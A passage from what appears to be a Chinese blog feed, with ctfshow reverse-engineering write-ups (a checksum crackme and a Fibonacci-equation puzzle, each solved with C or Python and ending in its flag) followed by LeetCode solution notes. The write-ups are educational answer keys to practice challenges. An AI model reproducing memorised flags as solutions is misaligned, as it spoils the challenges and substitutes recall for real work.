title="r2"></a>r2</h1><p>打开后得到如下伪代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+Ch] [rbp-134h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+10h] [rbp-130h]</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [rsp+14h] [rbp-12Ch]</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [rsp+18h] [rbp-128h]</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [rsp+1Ch] [rbp-124h]</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [rsp+20h] [rbp-120h]</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [rsp+24h] [rbp-11Ch]</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [rsp+28h] [rbp-118h]</span><br>  <span class="hljs-type">int</span> v13; <span class="hljs-comment">// [rsp+2Ch] [rbp-114h]</span><br>  <span class="hljs-type">int</span> v14; <span class="hljs-comment">// [rsp+30h] [rbp-110h]</span><br>  <span class="hljs-type">int</span> v15; <span class="hljs-comment">// [rsp+34h] [rbp-10Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v16; <span class="hljs-comment">// [rsp+38h] [rbp-108h]</span><br>  <span class="hljs-type">int</span> v17[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-100h]</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [rsp+60h] [rbp-E0h] BYREF</span><br>  <span class="hljs-type">char</span> v19[<span class="hljs-number">107</span>]; <span class="hljs-comment">// [rsp+65h] [rbp-DBh] BYREF</span><br>  <span class="hljs-type">char</span> dest[<span class="hljs-number">104</span>]; <span class="hljs-comment">// [rsp+D0h] [rbp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v21; <span class="hljs-comment">// [rsp+138h] [rbp-8h]</span><br><br>  v21 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v7 = <span class="hljs-number">80</span>;<br>  v8 = <span class="hljs-number">64227</span>;<br>  v9 = <span class="hljs-number">226312059</span>;<br>  v10 = <span class="hljs-number">-1540056586</span>;<br>  v11 = <span class="hljs-number">5</span>;<br>  v12 = <span class="hljs-number">16</span>;<br>  v13 = <span class="hljs-number">3833</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;plz input the key:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, s);<span class="hljs-comment">// 输入key</span><br>  v3 = <span class="hljs-built_in">strlen</span>(s);<span class="hljs-comment">// 计算输入长度</span><br>  <span class="hljs-built_in">strncpy</span>(dest, v19, v3 - <span class="hljs-number">6</span>);<span class="hljs-comment">// 将s的6~strlen(s)-1位复制到dest，输入s的长度不小于6</span><br>  dest[<span class="hljs-built_in">strlen</span>(s) - <span class="hljs-number">6</span>] = <span class="hljs-number">0</span>;<span class="hljs-comment">// 最后1位置0</span><br>  __isoc99_sscanf(dest, <span class="hljs-string">&quot;%x&quot;</span>, &amp;v5); <span class="hljs-comment">// 读取dest中16进制数到v5</span><br>  v17[<span class="hljs-number">0</span>] = v7;<br>  v17[<span class="hljs-number">1</span>] = v8;<br>  v17[<span class="hljs-number">2</span>] = v9;<br>  v17[<span class="hljs-number">3</span>] = v10;<br>  v17[<span class="hljs-number">4</span>] = (v11 &lt;&lt; <span class="hljs-number">12</span>) + v12;<br>  v17[<span class="hljs-number">5</span>] = v13;<br>  v17[<span class="hljs-number">6</span>] = v5;<br>  v16 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">6</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( v16 += (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v17[i]; v16 &gt; <span class="hljs-number">0xFFFF</span>; v16 = v15 + (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-type">unsigned</span> __int16)v16 )<span class="hljs-comment">// unsigned __int16只保留后4位</span><br>    &#123;<br>      v14 = (<span class="hljs-type">unsigned</span> __int16)v16;<span class="hljs-comment">// 没用到v14，这行可以忽略</span><br>      v15 = v16 &gt;&gt; <span class="hljs-number">16</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( v16 == <span class="hljs-number">0xFFFF</span> )<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Error&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>从47行可见v16分别加上了v17的前6位，因此前6位是保持不变的，根据题意，v17[6]就是所要求的flag，所以这里可以写出如下程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">int</span> v15 = <span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> __int64 v16 = <span class="hljs-number">0LL</span>;<br><span class="hljs-type">int</span> v17[<span class="hljs-number">7</span>] = &#123;<span class="hljs-number">80</span>, <span class="hljs-number">64227</span>, <span class="hljs-number">226312059</span>, <span class="hljs-number">-1540056586</span>, <span class="hljs-number">20496</span>, <span class="hljs-number">3833</span>, <span class="hljs-number">888</span>&#125;;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span> ; i &lt;= <span class="hljs-number">6</span>; ++i ) &#123;<br><span class="hljs-keyword">for</span> ( v16 += (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v17[i]; v16 &gt; <span class="hljs-number">0xFFFF</span>; v16 = v15 + (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-type">unsigned</span> __int16)v16 )<br>v15 = v16 &gt;&gt; <span class="hljs-number">16</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> ( v16 == <span class="hljs-number">0xFFFF</span> )<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK&quot;</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Error&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>调试到即将与v17[6]相加的地方</p><p><img src="https://image.0error.net/img/2022/20220308150013.png" alt="r2_debug"></p><p>v16先加上v17[6]，然后判断是否大于0xffff，小于等于0xffff即退出循环，由提示最小解，4位值，直接相减就可得出最终结果，最终得到flag即为<code>flag&#123;1a9f&#125;</code></p><h1 id="数学不及格-re3"><a href="#数学不及格-re3" class="headerlink" title="数学不及格_re3"></a>数学不及格_re3</h1><p>用IDA打开，可以看到是一个类似于数学方程问题</p><p><img src="https://image.0error.net/img/2022/20220315155940.png" alt="re3_main"></p><p>这里看到<code>v9</code>的值是<code>v4</code>经过函数<code>f</code>处理之后的值，再看一下函数f</p><p><img src="https://image.0error.net/img/2022/20220315160104.png" alt="re3_f"></p><p>可以看出f函数是一个斐波那契的处理过程</p><p>这里的处理应当为四个判断等式联立求解，划掉v10-v12，得v4+3*v9;又因为v9为v4下标范围内的斐波拉契数列值，因此通过0&lt;v4&lt;200,有爆破可能性，直接遍历爆破v4与v9。（v4&#x3D;58,v9&#x3D;591286729879），后面依次求解v10-v12，并把它们转化为字符串，由此可写出python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">n</span>):<br>    li=[]<br>    v9=<span class="hljs-number">0</span><br>    li.append(<span class="hljs-number">1</span>)<br>    li.append(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, n):<br>        li.append(li[i-<span class="hljs-number">1</span>] + li[i-<span class="hljs-number">2</span>])<br>        v9=li[i]<br>    <span class="hljs-keyword">return</span> v9<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">199</span>):<br>    v4 = i<br>    v9=f(v4)<br>    <span class="hljs-keyword">if</span>(v4+<span class="hljs-number">3</span>*v9==<span class="hljs-number">151381742876</span>+<span class="hljs-number">117138004530</span>+<span class="hljs-number">155894355749</span>+<span class="hljs-number">1349446086540</span>):<br>        <span class="hljs-built_in">print</span>(v4, v9)<br>        <span class="hljs-keyword">break</span><br><br>v10 = <span class="hljs-built_in">hex</span>(<span class="hljs-number">151381742876</span>-v9)<br>v11 = <span class="hljs-built_in">hex</span>(<span class="hljs-number">117138004530</span>-v9)<br>v12 = <span class="hljs-built_in">hex</span>(<span class="hljs-number">155894355749</span>-v9)<br><br>s=<span class="hljs-string">&#x27;666c61677b6e65776265655f686572657d&#x27;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(s), <span class="hljs-number">2</span>):<br>    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(s[i:i+<span class="hljs-number">2</span>], <span class="hljs-number">16</span>))<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>可得出结果如下</p><p><img src="https://image.0error.net/img/2022/20220315160345.png" alt="re3_result"></p><p>得到flag问题得解</p>]]></content>
      
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> ctfshow </tag>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode - 做题笔记</title>
      <link href="/2022/03/2e627859.html"/>
      <url>/2022/03/2e627859.html</url>
      
        <content type="html"><![CDATA[<p>这篇博客集中整理在LeetCode的刷题记录，方便查阅</p><h1 id="258-各位相加-力扣（LeetCode）-leetcode-cn-com"><a href="#258-各位相加-力扣（LeetCode）-leetcode-cn-com" class="headerlink" title="258. 各位相加 - 力扣（LeetCode） (leetcode-cn.com)"></a><a href="https://leetcode-cn.com/problems/add-digits/">258. 各位相加 - 力扣（LeetCode） (leetcode-cn.com)</a></h1><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">addDigits</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans=<span class="hljs-number">999999</span>;<br>        <span class="hljs-keyword">while</span>(ans &gt;= <span class="hljs-number">10</span>)<br>        &#123;<br>            ans=<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">while</span>(num!=<span class="hljs-number">0</span>)<br>            &#123;<br>                ans = ans + num%<span class="hljs-number">10</span>;<br>                num/=<span class="hljs-number">10</span>;<br>            &#125;<br>            num=ans;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="401-二进制手表-力扣（LeetCode）-leetcode-cn-com"><a href="#401-二进制手表-力扣（LeetCode）-leetcode-cn-com" class="headerlink" title="401. 二进制手表 - 力扣（LeetCode） (leetcode-cn.com)"></a><a href="https://leetcode-cn.com/problems/binary-watch/">401. 二进制手表 - 力扣（LeetCode） (leetcode-cn.com)</a></h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>二进制手表顶部有 4 个 LED 代表 小时（0-11），底部的 6 个 LED 代表 分钟（0-59）。每个 LED 代表一个 0 或 1，最低位在右侧。</p><p>例如，下面的二进制手表读取 “3:25” 。</p><p>给你一个整数 turnedOn ，表示当前亮着的 LED 的数量，返回二进制手表可以表示的所有可能时间。你可以 按任意顺序 返回答案。</p><p>小时不会以零开头：</p><p>例如，”01:00” 是无效的时间，正确的写法应该是 “1:00” 。<br>分钟必须由两位数组成，可能会以零开头：</p><p>例如，”10:2” 是无效的时间，正确的写法应该是 “10:02” 。</p><p>示例 1：</p><p>输入：turnedOn &#x3D; 1<br>输出：[“0:01”,”0:02”,”0:04”,”0:08”,”0:16”,”0:32”,”1:00”,”2:00”,”4:00”,”8:00”]<br>示例 2：</p><p>输入：turnedOn &#x3D; 9<br>输出：[]</p><p>提示：</p><p>0 &lt;&#x3D; turnedOn &lt;&#x3D; 10</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>思路比较直接，就是枚举出这个二进制数的每一位，然后分别判定是否符合时间单位的标准，如果是的话就保存下来输出即可，主要还是要学习二进制位运算的相关操作。</p><h2 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;string&gt; <span class="hljs-title">readBinaryWatch</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        vector&lt;string&gt; res;<br>        <span class="hljs-type">char</span> str[<span class="hljs-number">10</span>];<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">10</span>;i++)<span class="hljs-comment">//枚举每一位</span><br>        &#123;<br>            <span class="hljs-type">int</span> s=<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">10</span>;j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span>(i&gt;&gt;j &amp; <span class="hljs-number">1</span>)<span class="hljs-comment">//如果i的第j位是1</span><br>                    s++;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(s==num)<br>            &#123;<br>                <span class="hljs-type">int</span> a=i&gt;&gt;<span class="hljs-number">6</span>, b=i&amp;<span class="hljs-number">63</span>;<span class="hljs-comment">//63=各个位均为1,a取了i的小时(最高的四位)</span><br>                <span class="hljs-keyword">if</span>(a&lt;<span class="hljs-number">12</span> &amp;&amp; b&lt;<span class="hljs-number">60</span>)<br>                &#123;<br>                    <span class="hljs-built_in">sprintf</span>(str, <span class="hljs-string">&quot;%d:%02d&quot;</span>, a, b);<br>                    res.<span class="hljs-built_in">push_back</span>(str);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="2104-子数组范围和-力扣（LeetCode）-leetcode-cn-com"><a href="#2104-子数组范围和-力扣（LeetCode）-leetcode-cn-com" class="headerlink" title="2104. 子数组范围和 - 力扣（LeetCode） (leetcode-cn.com)"></a><a href="https://leetcode-cn.com/problems/sum-of-subarray-ranges/">2104. 子数组范围和 - 力扣（LeetCode） (leetcode-cn.com)</a></h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>枚举计算出每个子数组之间最大值与最小值的差值并加在最终结果中即可</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-title">subArrayRanges</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> res=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            <span class="hljs-type">int</span> minVal=INT_MAX, maxVal=INT_MIN;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i;j&lt;n;j++)<br>            &#123;<br>                minVal = <span class="hljs-built_in">min</span>(minVal, nums[j]);<br>                maxVal = <span class="hljs-built_in">max</span>(maxVal, nums[j]);<br>                res+=maxVal - minVal;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="521-最长特殊序列-Ⅰ-力扣（LeetCode）-leetcode-cn-com"><a href="#521-最长特殊序列-Ⅰ-力扣（LeetCode）-leetcode-cn-com" class="headerlink" title="521. 最长特殊序列 Ⅰ - 力扣（LeetCode） (leetcode-cn.com)"></a><a href="https://leetcode-cn.com/problems/longest-uncommon-subsequence-i/">521. 最长特殊序列 Ⅰ - 力扣（LeetCode） (leetcode-cn.com)</a></h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>究竟贪心题，如果两者长度相等，那么一定没有特殊串，如果长度不等，那么长的一串一定不会不特殊（短的再怎么删也不会变长）</p><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findLUSlength</span><span class="hljs-params">(string a, string b)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(a==b)    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(a.<span class="hljs-built_in">size</span>(), b.<span class="hljs-built_in">size</span>());<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="504-七进制数-力扣（LeetCode）-leetcode-cn-com"><a href="#504-七进制数-力扣（LeetCode）-leetcode-cn-com" class="headerlink" title="504. 七进制数 - 力扣（LeetCode） (leetcode-cn.com)"></a><a href="https://leetcode-cn.com/problems/base-7/">504. 七进制数 - 力扣（LeetCode） (leetcode-cn.com)</a></h1><h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">convertToBase7</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(!num)    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0&quot;</span>;<br>        <span class="hljs-type">bool</span> is_neg = num &lt; <span class="hljs-number">0</span>;<br>        num = <span class="hljs-built_in">abs</span>(num);<br>        string res;<br>        <span class="hljs-keyword">while</span>(num)<br>            res+= <span class="hljs-built_in">to_string</span>(num%<span class="hljs-number">7</span>), num/=<span class="hljs-number">7</span>;<br>        <span class="hljs-built_in">reverse</span>(res.<span class="hljs-built_in">begin</span>(), res.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-keyword">if</span>(is_neg)  <br>            res = <span class="hljs-string">&#x27;-&#x27;</span>+res;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="LeetCode-2049-统计最高分的节点数目"><a href="#LeetCode-2049-统计最高分的节点数目" class="headerlink" title="LeetCode 2049. 统计最高分的节点数目"></a><a href="https://leetcode-cn.com/problems/count-nodes-with-the-highest-score/">LeetCode 2049. 统计最高分的节点数目</a></h1><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>在一棵树中，当把一个节点和与它相连的所有边删除，剩余部分最多是三棵非空子树，即原节点的左子树，右子树，以及把以这个节点为根结点的子树移除所形成的子树（除根结点外均有），最少数量则无此类特性。而题目中提到各节点的分数为这些子树的<strong>节点</strong>个数的乘积。我们可以先用 <code>parents</code> 数组统计出每个节点的子节点，然后使用深度优先搜索来计算以每个节点为根结点的子树的大小，同时计算每个节点的大小，作为深度优先搜索的返回值，最后统计最大分数出现的次数。在实现上，统计最大分数出现的次数可以放到深度优先搜索中完成，从而节省一部分空间。</p><h2 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> n;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> maxScore=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> cnt=<span class="hljs-number">0</span>;<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; children;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> node)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> size = n<span class="hljs-number">-1</span>;<br>        <span class="hljs-type">long</span> <span class="hljs-type">long</span> score = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> c:children[node])<br>        &#123;<br>            <span class="hljs-type">int</span> t = <span class="hljs-built_in">dfs</span>(c);<br>            score *= t;<br>            size -= t;<span class="hljs-comment">//算出节点大小，让size减去他</span><br><br>        &#125;<br>        <span class="hljs-keyword">if</span>(node != <span class="hljs-number">0</span>)<br>        &#123;<br>            score *= size;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(score == maxScore)<br>            cnt++;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(score &gt; maxScore)<br>        &#123;<br>            maxScore = score;<br>            cnt=<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> n-size;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">countHighestScoreNodes</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; parents)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>-&gt;n = parents.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-keyword">this</span>-&gt;children = vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; (n);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            <span class="hljs-type">int</span> p = parents[i];<br>            <span class="hljs-keyword">if</span>(p!=<span class="hljs-number">-1</span>)<br>            &#123;<br>                children[p].<span class="hljs-built_in">emplace_back</span>(i);<span class="hljs-comment">//记录p节点的儿子节点</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-built_in">dfs</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> cnt;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="LeetCode-599-两个列表的最小索引总和"><a href="#LeetCode-599-两个列表的最小索引总和" class="headerlink" title="LeetCode 599. 两个列表的最小索引总和"></a><a href="https://leetcode-cn.com/problems/minimum-index-sum-of-two-lists/">LeetCode 599. 